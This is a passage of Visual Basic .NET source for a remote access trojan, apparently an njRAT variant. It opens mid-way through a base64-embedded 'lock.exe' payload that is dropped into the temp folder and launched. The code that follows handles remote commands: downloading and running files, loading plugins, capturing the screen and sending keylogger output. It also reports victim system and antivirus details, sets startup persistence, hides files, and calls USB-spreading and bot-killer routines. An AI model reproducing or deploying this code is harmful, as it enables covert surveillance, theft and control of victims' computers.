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")
                        IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\" & "lock.exe", byt)
                        Diagnostics.Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp & "\" & "lock.exe")

                        Exit Select

                    Case "lockoff"


                        Dim file As System.IO.StreamWriter
                        file = My.Computer.FileSystem.OpenTextFileWriter(IO.Path.GetTempPath & "select.dat", True)
                        File.WriteLine("002")
                        File.Close()

                        Try
                            If System.IO.File.Exists(IO.Path.GetTempPath & "lock.exe") = True Then
                                System.IO.File.Delete(IO.Path.GetTempPath & "lock.exe")
                            End If
                        Catch
                        End Try

                        Exit Select



                    Case "rainbow"

                        Dim hwnd As IntPtr = GetDesktopWindow()
                        Dim hdc As IntPtr = GetWindowDC(hwnd)
                        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
                        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
                        Dim fuck As New Random

                        Dim brush As IntPtr = CreateSolidBrush(CUInt(fuck.Next(0, &HFFFFFF + 1)))
                        SelectObject(hdc, brush)
                        PatBlt(hdc, 0, 0, x, y, CopyPixelOperation.PatInvert)
                        DeleteObject(brush)

                        Exit Select

                    Case "newmouse"
                        Dim MouseThread As Thread = New Thread(New ThreadStart(AddressOf Mouse))
                        MouseThread.Start()
                        Exit Select

                    Case "OpenCD"
                        mciSendString("set CDAudio door open", vbNullString, 0, IntPtr.Zero)
                        Exit Select

                    Case "CloseCD"
                        mciSendString("set CDAudio door closed", vbNullString, 0, IntPtr.Zero)
                        Exit Select



                    Case "HideTask" 
                        Dim hWnd As IntPtr = FindWindow("Shell_TrayWnd", Nothing)
                        ShowWindow(hWnd, SW.Hide)
                        Return

                    Case "ShowTask" 
                        Dim hWnd As IntPtr = FindWindow("Shell_TrayWnd", Nothing)
                        ShowWindow(hWnd, SW.ShowNoActivate)
                        Return

                    Case "HideDesk" 
                        Dim hWnd As IntPtr = FindWindow("Progman", Nothing)
                        ShowWindow(hWnd, SW.Hide)
                        Return

                    Case "ShowDesk" 
                        Dim hWnd As IntPtr = FindWindow("Progman", Nothing)
                        ShowWindow(hWnd, SW.ShowNoActivate)
                        Return

                    Case "Error"
                        Dim messageBoxButton As MessageBoxButtons = DirectCast(0, MessageBoxButtons)
                        Dim messageBoxIcon As System.Windows.Forms.MessageBoxIcon = DirectCast(0, System.Windows.Forms.MessageBoxIcon)
                        Dim str6 As String = strArray(1)
                        If (Operators.CompareString(str6, "Error", False) = 0) Then
                            messageBoxIcon = System.Windows.Forms.MessageBoxIcon.Asterisk
                        ElseIf (Operators.CompareString(str6, "Question", False) = 0) Then
                            messageBoxIcon = System.Windows.Forms.MessageBoxIcon.Question
                        ElseIf (Operators.CompareString(str6, "Warning", False) = 0) Then
                            messageBoxIcon = System.Windows.Forms.MessageBoxIcon.Exclamation
                        ElseIf (Operators.CompareString(str6, "Info", False) = 0) Then
                            messageBoxIcon = System.Windows.Forms.MessageBoxIcon.Hand
                        End If
                        Dim str7 As String = strArray(2)
                        If (Operators.CompareString(str7, "YesNo", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.YesNo
                        ElseIf (Operators.CompareString(str7, "YesNoCancel", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.YesNoCancel
                        ElseIf (Operators.CompareString(str7, "OK", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.OK
                        ElseIf (Operators.CompareString(str7, "OKCancel", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.OKCancel
                        ElseIf (Operators.CompareString(str7, "RetryCancel", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.RetryCancel
                        ElseIf (Operators.CompareString(str7, "AbortRetryCancel", False) = 0) Then
                            messageBoxButton = MessageBoxButtons.AbortRetryIgnore
                        End If
                        MessageBox.Show(strArray(4), strArray(3), messageBoxButton, messageBoxIcon)
                        Return

                    Case "Speech" 'speech

                        Dim Voice = CreateObject("SAPI.spvoice")
                        Voice.speak(String.Concat(New String() {strArray(1)}))
                        Return

                    Case "fun"
                        OK.Send("fun")
                        Return

                    Case "Piano"
                        Beep(String.Concat(New String() {strArray(1)}), "300")
                        Return

                    Case "sht"

                        System.Diagnostics.Process.Start("Shutdown", "/s /t 00")

                        Return

                    Case "rst"

                        System.Diagnostics.Process.Start("Shutdown", "/r /t 00")

                        Return

                    Case "lof"

                        System.Diagnostics.Process.Start("Shutdown", "/l /f")

                        Return


                    Case "botk"
                        BotKillers.RunStandardBotKiller()

                    Case "ll"
                        OK.Cn = False
                        Return
                    Case "kl"
                        OK.Send(("kl" & OK.Y & OK.ENB(OK.kq.Logs)))
                        Return
                    Case "prof"
                        Select Case strArray(1)
                            Case "~"
                                OK.STV(strArray(2), strArray(3), RegistryValueKind.String)
                                Exit Select
                            Case "!"
                                OK.STV(strArray(2), strArray(3), RegistryValueKind.String)
                                OK.Send(Conversions.ToString(Operators.ConcatenateObject((("getvalue" & OK.Y) & strArray(1) & OK.Y), OK.GTV(strArray(1), ""))))
                                Exit Select
                            Case "@"
                                OK.DLV(strArray(2))
                                Exit Select
                        End Select
                        Return
                End Select
                If (str4 <> "rn") Then
                    GoTo Label_0294
                End If
                If (strArray(2).Chars(0) = ChrW(31)) Then
                    Try
                        Dim stream As New MemoryStream
                        Dim length As Integer = (strArray(0) & OK.Y & strArray(1) & OK.Y).Length
                        stream.Write(b, length, (b.Length - length))
                        buffer = OK.ZIP(stream.ToArray)
                        GoTo Label_020B
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        OK.Send(("MSG" & OK.Y & "Execute ERROR"))
                        OK.Send("bla")
                        ProjectData.ClearProjectError()
                        Return
                    End Try
                End If
                Dim client As New WebClient
                Try
                    buffer = client.DownloadData(strArray(2))
                Catch exception10 As Exception
                    ProjectData.SetProjectError(exception10)
                    Dim exception2 As Exception = exception10
                    OK.Send(("MSG" & OK.Y & "Download ERROR"))
                    OK.Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
Label_020B:
                OK.Send("bla")
                Dim path As String = (IO.Path.GetTempPath & Guid.NewGuid.ToString().Replace("-", "") & "." & strArray(1))
                Try
                    File.WriteAllBytes(path, buffer)
                    Process.Start(path)
                    OK.Send(("MSG" & OK.Y & "Executed As " & New FileInfo(path).Name))
                    Return
                Catch exception11 As Exception
                    ProjectData.SetProjectError(exception11)
                    Dim exception3 As Exception = exception11
                    OK.Send(("MSG" & OK.Y & "Execute ERROR " & exception3.Message))
                    ProjectData.ClearProjectError()
                    Return
                End Try
Label_0294:
                Select Case str4
                    Case "inv"
                        Dim t As Byte() = DirectCast(OK.GTV(strArray(1), New Byte(0 - 1) {}), Byte())
                        If ((strArray(3).Length < 10) And (t.Length = 0)) Then
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(1)}))
                        Else
                            If (strArray(3).Length > 10) Then
                                Dim stream2 As New MemoryStream
                                Dim offset As Integer = String.Concat(New String() {strArray(0), OK.Y, strArray(1), OK.Y, strArray(2), OK.Y}).Length
                                stream2.Write(b, offset, (b.Length - offset))
                                t = OK.ZIP(stream2.ToArray)
                                OK.STV(strArray(1), t, RegistryValueKind.Binary)
                            End If
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(OK.Plugin(t, "A"))
                            NewLateBinding.LateSet(objectValue, Nothing, "h", New Object() {OK.H}, Nothing, Nothing)
                            NewLateBinding.LateSet(objectValue, Nothing, "p", New Object() {OK.P}, Nothing, Nothing)
                            NewLateBinding.LateSet(objectValue, Nothing, "osk", New Object() {strArray(2)}, Nothing, Nothing)
                            NewLateBinding.LateCall(objectValue, Nothing, "start", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
                            Do While Not Conversions.ToBoolean(Operators.OrObject(Not OK.Cn, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, Nothing, "Off", New Object(0 - 1) {}, Nothing, Nothing, Nothing), True, False)))
                                Thread.Sleep(1)
                            Loop
                            NewLateBinding.LateSet(objectValue, Nothing, "off", New Object() {True}, Nothing, Nothing)
                        End If
                        Return
                    Case "ret"
                        Dim buffer3 As Byte() = DirectCast(OK.GTV(strArray(1), New Byte(0 - 1) {}), Byte())
                        If ((strArray(2).Length < 10) And (buffer3.Length = 0)) Then
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(1)}))
                        Else
                            If (strArray(2).Length > 10) Then
                                Dim stream3 As New MemoryStream
                                Dim num3 As Integer = (strArray(0) & OK.Y & strArray(1) & OK.Y).Length
                                stream3.Write(b, num3, (b.Length - num3))
                                buffer3 = OK.ZIP(stream3.ToArray)
                                OK.STV(strArray(1), buffer3, RegistryValueKind.Binary)
                            End If
                            OK.Send(String.Concat(New String() {"pl", OK.Y, strArray(1), OK.Y, Conversions.ToString(0)}))
                            Dim instance As Object = RuntimeHelpers.GetObjectValue(OK.Plugin(buffer3, "A"))
                            OK.Send(String.Concat(New String() {"ret", OK.Y, strArray(1), OK.Y, OK.ENB(Conversions.ToString(NewLateBinding.LateGet(instance, Nothing, "GT", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))}))
                        End If
                        Return
                    Case "CAP"
                        Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
                        Dim image As New Bitmap(Screen.PrimaryScreen.Bounds.Width, bounds.Height, PixelFormat.Format16bppRgb555)
                        Dim g As Graphics = Graphics.FromImage(image)
                        Dim blockRegionSize As New Size(image.Width, image.Height)
                        g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy)
                        Try
                            blockRegionSize = New Size(&H20, &H20)
                            bounds = New Rectangle(Cursor.Position, blockRegionSize)
                            Cursors.Default.Draw(g, bounds)
                        Catch exception12 As Exception
                            ProjectData.SetProjectError(exception12)
                            Dim exception4 As Exception = exception12
                            ProjectData.ClearProjectError()
                        End Try
                        g.Dispose()
                        Dim bitmap2 As New Bitmap(Conversions.ToInteger(strArray(1)), Conversions.ToInteger(strArray(2)))
                        g = Graphics.FromImage(bitmap2)
                        g.DrawImage(image, 0, 0, bitmap2.Width, bitmap2.Height)
                        g.Dispose()
                        Dim stream4 As New MemoryStream
                        b = OK.SB(("CAP" & OK.Y))
                        stream4.Write(b, 0, b.Length)
                        Dim stream5 As New MemoryStream
                        bitmap2.Save(stream5, ImageFormat.Jpeg)
                        Dim str2 As String = OK.md5(stream5.ToArray)
                        If (str2 <> OK.lastcap) Then
                            OK.lastcap = str2
                            stream4.Write(stream5.ToArray, 0, CInt(stream5.Length))
                        Else
                            stream4.WriteByte(0)
                        End If
                        OK.Sendb(stream4.ToArray)
                        stream4.Dispose()
                        stream5.Dispose()
                        image.Dispose()
                        bitmap2.Dispose()
                        Return
                    Case "un"
                        Select Case strArray(1)
                            Case "~"
                                OK.UNS()
                                Exit Select
                            Case "!"
                                OK.pr(0)
                                ProjectData.EndApp()
                                Exit Select
                            Case "@"
                                OK.pr(0)
                                Process.Start(OK.LO.FullName)
                                ProjectData.EndApp()
                                Exit Select

                        End Select
                        Return
                End Select




                If (str4 <> "up") Then
                    GoTo Label_0A1C
                End If
                Dim bytes As Byte() = Nothing
                If (strArray(1).Chars(0) = ChrW(31)) Then
                    Try
                        Dim stream6 As New MemoryStream
                        Dim num4 As Integer = (strArray(0) & OK.Y).Length
                        stream6.Write(b, num4, (b.Length - num4))
                        bytes = OK.ZIP(stream6.ToArray)
                        GoTo Label_097B
                    Catch exception13 As Exception
                        ProjectData.SetProjectError(exception13)
                        Dim exception5 As Exception = exception13
                        OK.Send(("MSG" & OK.Y & "Update ERROR"))
                        OK.Send("bla")
                        ProjectData.ClearProjectError()
                        Return
                    End Try
                End If
                Dim client2 As New WebClient
                Try
                    bytes = client2.DownloadData(strArray(1))
                Catch exception14 As Exception
                    ProjectData.SetProjectError(exception14)
                    Dim exception6 As Exception = exception14
                    OK.Send(("MSG" & OK.Y & "Update ERROR"))
                    OK.Send("bla")
                    ProjectData.ClearProjectError()
                    Return
                End Try
Label_097B:
                OK.Send("bla")
                Dim fileName As String = (IO.Path.GetTempPath & Guid.NewGuid.ToString().Replace("-", "") & ".exe")
                Try
                    OK.Send(("MSG" & OK.Y & "Updating To " & New FileInfo(fileName).Name))
                    Thread.Sleep(&H7D0)
                    File.WriteAllBytes(fileName, bytes)
                    Process.Start(fileName, "..")
                Catch exception15 As Exception
                    ProjectData.SetProjectError(exception15)
                    Dim exception7 As Exception = exception15
                    OK.Send(("MSG" & OK.Y & "Update ERROR " & exception7.Message))
                    ProjectData.ClearProjectError()
                    Return
                End Try
                OK.UNS()
                Return
Label_0A1C:
                If (str4 = "Ex") Then
                    If (OK.PLG Is Nothing) Then
                        OK.Send("PLG")
                        Dim num5 As Integer = 0
                        Do While Not (((Not OK.PLG Is Nothing) Or (num5 = 20)) Or Not OK.Cn)
                            num5 += 1
                            Thread.Sleep(&H3E8)
                        Loop
                        If ((OK.PLG Is Nothing) Or Not OK.Cn) Then
                            Return
                        End If
                    End If
                    Dim arguments As Object() = New Object() {b}
                    Dim copyBack As Boolean() = New Boolean() {True}
                    NewLateBinding.LateCall(OK.PLG, Nothing, "ind", arguments, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        b = DirectCast(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Byte())), Byte())
                    End If
                ElseIf (str4 = "PLG") Then
                    Dim stream7 As New MemoryStream
                    Dim num6 As Integer = (strArray(0) & OK.Y).Length
                    stream7.Write(b, num6, (b.Length - num6))
                    OK.PLG = RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(stream7.ToArray), "A"))
                    NewLateBinding.LateSet(OK.PLG, Nothing, "H", New Object() {OK.H}, Nothing, Nothing)
                    NewLateBinding.LateSet(OK.PLG, Nothing, "P", New Object() {OK.P}, Nothing, Nothing)
                    NewLateBinding.LateSet(OK.PLG, Nothing, "c", New Object() {OK.C}, Nothing, Nothing)
                End If
            Catch exception16 As Exception
                ProjectData.SetProjectError(exception16)
                Dim exception8 As Exception = exception16
                If ((strArray.Length > 0) AndAlso ((strArray(0) = "Ex") Or (strArray(0) = "PLG"))) Then
                    OK.PLG = Nothing
                End If
                Try
                    OK.Send(String.Concat(New String() {"ER", OK.Y, strArray(0), OK.Y, exception8.Message}))
                Catch exception17 As Exception
                    ProjectData.SetProjectError(exception17)
                    Dim exception9 As Exception = exception17
                    ProjectData.ClearProjectError()
                End Try
                ProjectData.ClearProjectError()
            End Try
        End Sub

        Public Shared Function inf() As String
            Dim str2 As String = ("ll" & OK.Y)
            Try
                If Operators.ConditionalCompareObjectEqual(OK.GTV("vn", ""), "", False) Then
                    str2 = (str2 & OK.ENB((OK.DEB(OK.VN) & "_" & OK.HWD)) & OK.Y)
                Else
                    str2 = (str2 & OK.ENB((OK.DEB(Conversions.ToString(OK.GTV("vn", ""))) & "_" & OK.HWD)) & OK.Y)
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str2 = (str2 & OK.ENB(OK.HWD) & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & Environment.MachineName & OK.Y)
            Catch exception9 As Exception
                ProjectData.SetProjectError(exception9)
                Dim exception2 As Exception = exception9
                str2 = (str2 & "??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & Environment.UserName & OK.Y)
            Catch exception10 As Exception
                ProjectData.SetProjectError(exception10)
                Dim exception3 As Exception = exception10
                str2 = (str2 & "??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            Try
                str2 = (str2 & OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") & OK.Y)
            Catch exception11 As Exception
                ProjectData.SetProjectError(exception11)
                Dim exception4 As Exception = exception11
                str2 = (str2 & "??-??-??" & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            str2 = (str2 & "" & OK.Y)
            Try
                str2 = (str2 & OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win"))
            Catch exception12 As Exception
                ProjectData.SetProjectError(exception12)
                Dim exception5 As Exception = exception12
                str2 = (str2 & "??")
                ProjectData.ClearProjectError()
            End Try
            str2 = (str2 & "SP")
            Try
                Dim strArray As String() = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary)
                If (strArray.Length = 1) Then
                    str2 = (str2 & "0")
                End If
                str2 = (str2 & strArray((strArray.Length - 1)))
            Catch exception13 As Exception
                ProjectData.SetProjectError(exception13)
                Dim exception6 As Exception = exception13
                str2 = (str2 & "0")
                ProjectData.ClearProjectError()
            End Try
            Try
                If Environment.GetFolderPath(SpecialFolder.ProgramFiles).Contains("x86") Then
                    str2 = (str2 & " x64" & OK.Y)
                Else
                    str2 = (str2 & " x86" & OK.Y)
                End If
            Catch exception14 As Exception
                ProjectData.SetProjectError(exception14)
                Dim exception7 As Exception = exception14
                str2 = (str2 & OK.Y)
                ProjectData.ClearProjectError()
            End Try
            If OK.Cam Then
                str2 = (str2 & "Yes" & OK.Y)
            Else
                str2 = (str2 & "No" & OK.Y)
            End If
            str2 = String.Concat(New String() {str2, OK.GetAntiVirus, OK.Y, OK.GetAntiVirus, OK.Y, OK.GetAntiVirus, OK.Y})
            Dim str3 As String = ""
            Try
                Dim str4 As String
                For Each str4 In OK.F.Registry.CurrentUser.CreateSubKey(("Software\" & OK.RG), RegistryKeyPermissionCheck.Default).GetValueNames
                    If (str4.Length = &H20) Then
                        str3 = (str3 & str4 & ",")
                    End If
                Next
            Catch exception15 As Exception
                ProjectData.SetProjectError(exception15)
                Dim exception8 As Exception = exception15
                ProjectData.ClearProjectError()
            End Try
            Return (str2 & str3)
        End Function

        Public Shared Sub INS()
            Thread.Sleep(&H3E8)

            If (OK.Idr AndAlso Not OK.CompDir(OK.LO, New FileInfo((Interaction.Environ(OK.DR).ToLower & "\" & OK.EXE.ToLower)))) Then
                Try
                    If File.Exists((Interaction.Environ(OK.DR) & "\" & OK.EXE)) Then
                        File.Delete((Interaction.Environ(OK.DR) & "\" & OK.EXE))
                    End If
                    Dim stream As New FileStream((Interaction.Environ(OK.DR) & "\" & OK.EXE), FileMode.CreateNew)
                    Dim array As Byte() = File.ReadAllBytes(OK.LO.FullName)
                    stream.Write(array, 0, array.Length)
                    stream.Flush()
                    stream.Close()
                    OK.LO = New FileInfo((Interaction.Environ(OK.DR) & "\" & OK.EXE))
                    Process.Start(OK.LO.FullName)
                    ProjectData.EndApp()
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.EndApp()
                    ProjectData.ClearProjectError()
                End Try
            End If
            Try
                Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception2 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try

            If OK.Isu Then
                Try
                    OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                Catch exception9 As Exception
                    ProjectData.SetProjectError(exception9)
                    Dim exception4 As Exception = exception9
                    ProjectData.ClearProjectError()
                End Try
                Try
                    OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, True).SetValue(OK.RG, ("""" & OK.LO.FullName & """ .."))
                Catch exception10 As Exception
                    ProjectData.SetProjectError(exception10)
                    Dim exception5 As Exception = exception10
                    ProjectData.ClearProjectError()
                End Try
            End If
            If OK.IsF Then
                Try

                    If File.Exists((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG)) Then
                        File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG))
                    End If
                    File.Copy(OK.LO.FullName, (Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG), True)
                    ' OK.FS = New FileStream((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG), FileMode.Open)
                    Dim newRG As String = System.IO.Path.GetFileNameWithoutExtension(Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG)
                    Dim lnkName As String = newRG
                    If File.Exists((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & lnkName & ".url")) Then
                        File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & lnkName & ".url"))
                    End If

                    'credit to hallaj-hacker 
                    Dim install As String = (Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG)
                    Dim dest As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                    Using writer = New System.IO.StreamWriter(dest & "\" & lnkName & ".url")
                        System.IO.File.SetAttributes(install, System.IO.FileAttributes.Hidden)
                        writer.WriteLine("[InternetShortcut]")
                        writer.WriteLine("URL=file:///" & install)
                        writer.WriteLine("IconIndex=17")
                        writer.WriteLine("IconFile=C:\Windows\system32\SHELL32.dll")
                        writer.Flush()
                    End Using

                    If Conversions.ToBoolean(OK.HIDE_ME) = True Then
                        File.SetAttributes((Application.ExecutablePath), FileAttributes.Hidden)
                        'File.SetAttributes((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & OK.RG), FileAttributes.Hidden)
                    Else
                    End If
                Catch exception11 As Exception
                    ProjectData.SetProjectError(exception11)
                    Dim exception6 As Exception = exception11
                    ProjectData.ClearProjectError()
                End Try
            End If



        End Sub


        Public Shared Sub ko()

            Thread.Sleep(CInt(Math.Round(Math.Round(Conversions.ToDouble(OK.SLP) * 1000.0))))

            If OK.Anti_CH = True Then
                Try
                    MyAntiProcess.Start()
                Catch
                End Try
            Else
            End If

            If OK.BOT_KILL = True Then
                Try
                    BotKillers.RunStandardBotKiller()
                    Thread.Sleep(50)
                Catch
                End Try
            Else
            End If

            If OK.USB_SP = True Then
                Try
                    spredusb.Start()
                Catch
                End Try
            End If

            If OK.Persis = True Then
                Try
                    Persistence.Startup()
                Catch
                End Try
            End If



            If (Not Interaction.Command Is Nothing) Then
                Try
